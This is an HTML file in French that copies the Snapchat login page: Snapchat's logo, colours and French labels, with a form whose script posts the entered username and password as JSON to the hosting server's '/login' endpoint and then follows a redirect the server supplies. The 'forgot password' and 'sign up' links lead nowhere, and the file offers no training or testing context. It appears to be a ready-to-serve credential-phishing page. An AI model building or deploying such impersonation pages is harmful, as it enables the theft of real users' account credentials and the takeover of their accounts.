<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Snapchat</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f8f8f8;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            background: white;
            width: 100%;
            max-width: 400px;
            padding: 60px 40px;
            text-align: center;
            border-radius: 0;
            box-shadow: none;
        }

        .snapchat-logo {
            width: 60px;
            height: 60px;
            margin: 0 auto 40px;
            display: block;
        }

        .title {
            font-size: 28px;
            font-weight: 400;
            color: #333;
            margin-bottom: 60px;
            line-height: 1.2;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-label {
            display: block;
            font-size: 14px;
            color: #8c8c8c;
            margin-bottom: 8px;
            font-weight: 400;
        }

        .input-field {
            width: 100%;
            padding: 16px 0;
            border: none;
            border-bottom: 2px solid #e8e8e8;
            background: transparent;
            font-size: 16px;
            color: #333;
            outline: none;
            transition: border-color 0.3s ease;
        }

        .input-field:focus {
            border-bottom-color: #0eadff;
        }

        .input-field::placeholder {
            color: transparent;
        }

        .forgot-password {
            color: #8c8c8c;
            text-decoration: none;
            font-size: 14px;
            float: right;
            margin-top: 10px;
            margin-bottom: 40px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .login-button {
            width: 100%;
            background: #FFFC00;
            color: #333;
            border: none;
            border-radius: 25px;
            padding: 16px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 60px;
            transition: background-color 0.3s ease;
        }

        .login-button:hover {
            background: #e6e200;
        }

        .login-button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .signup-section {
            background: #f0f0f0;
            padding: 20px;
            margin: 0 -40px -60px -40px;
            text-align: center;
        }

        .signup-text {
            font-size: 14px;
            color: #666;
        }

        .signup-link {
            color: #0eadff;
            text-decoration: none;
            font-weight: 500;
        }

        .signup-link:hover {
            text-decoration: underline;
        }

        .error {
            background: #fee;
            border: 1px solid #fcc;
            color: #c33;
            padding: 12px;
            border-radius: 4px;
            font-size: 14px;
            margin-bottom: 16px;
            text-align: left;
            display: none;
        }

        .loading {
            display: none;
            color: #0eadff;
            font-size: 14px;
            margin-top: 8px;
        }

        @media (max-width: 768px) {
            body {
                padding: 0;
                background-color: white;
            }

            .login-container {
                max-width: 100%;
                min-height: 100vh;
                padding: 40px 30px;
                border-radius: 0;
                display: flex;
                flex-direction: column;
                justify-content: center;
            }

            .title {
                font-size: 24px;
                margin-bottom: 50px;
            }

            .snapchat-logo {
                width: 50px;
                height: 50px;
                margin-bottom: 30px;
            }

            .signup-section {
                position: fixed;
                bottom: 0;
                left: 0;
                right: 0;
                margin: 0;
                padding: 25px;
            }
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 30px 25px;
            }

            .title {
                font-size: 22px;
                margin-bottom: 40px;
            }

            .input-field {
                padding: 14px 0;
                font-size: 16px;
            }

            .login-button {
                padding: 14px;
                font-size: 16px;
                margin-bottom: 40px;
            }

            .forgot-password {
                margin-bottom: 30px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat" class="snapchat-logo" />
        
        <h1 class="title">Se connecter à<br>Snapchat</h1>

        <form id="loginForm">
            <div id="error" class="error"></div>

            <div class="form-group">
                <label class="form-label">Nom d'utilisateur ou adresse e-mail</label>
                <input 
                    type="text" 
                    id="username" 
                    class="input-field" 
                    required
                />
            </div>

            <div class="form-group">
                <label class="form-label">Mot de passe</label>
                <input 
                    type="password" 
                    id="password" 
                    class="input-field" 
                    required
                />
            </div>

            <a href="#" class="forgot-password">Mot de passe oublié</a>
            <div style="clear: both;"></div>

            <button type="submit" id="loginBtn" class="login-button">
                Connexion
            </button>

            <div id="loading" class="loading">Connexion en cours...</div>
        </form>

        <div class="signup-section">
            <span class="signup-text">Nouveau sur Snapchat ? </span>
            <a href="#" class="signup-link">S'inscrire</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const loginBtn = document.getElementById('loginBtn');
            const loading = document.getElementById('loading');
            const error = document.getElementById('error');
            
            // Reset error state
            error.style.display = 'none';
            error.textContent = '';
            
            // Validation
            if (!username || !password) {
                error.textContent = 'Veuillez remplir tous les champs.';
                error.style.display = 'block';
                return;
            }
            
            // Loading state
            loginBtn.disabled = true;
            loginBtn.textContent = 'Connexion...';
            loading.style.display = 'block';
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        username: username, 
                        password: password 
                    })
                });
                
                const data = await response.json();
                
                if (data.status === 'success') {
                    if (data.redirect) {
                        window.location.href = data.redirect;
                    } else {
                        loginBtn.textContent = 'Connecté !';
                        setTimeout(() => {
                            alert('Connexion réussie !');
                        }, 500);
                    }
                } else {
                    throw new Error(data.message || 'Erreur de connexion');
                }
                
            } catch (err) {
                console.error('Login error:', err);
                error.textContent = 'Nom d\'utilisateur ou mot de passe incorrect. Veuillez réessayer.';
                error.style.display = 'block';
                
                loginBtn.disabled = false;
                loginBtn.textContent = 'Connexion';
                loading.style.display = 'none';
            }
        });

        // Clear error when typing
        document.querySelectorAll('.input-field').forEach(input => {
            input.addEventListener('input', function() {
                const error = document.getElementById('error');
                if (error.style.display === 'block') {
                    error.style.display = 'none';
                }
            });
        });

        // Label animation effect
        document.querySelectorAll('.input-field').forEach(input => {
            input.addEventListener('focus', function() {
                this.previousElementSibling.style.color = '#0eadff';
            });
            
            input.addEventListener('blur', function() {
                if (!this.value) {
                    this.previousElementSibling.style.color = '#8c8c8c';
                }
            });
        });
    </script>
</body>
</html>
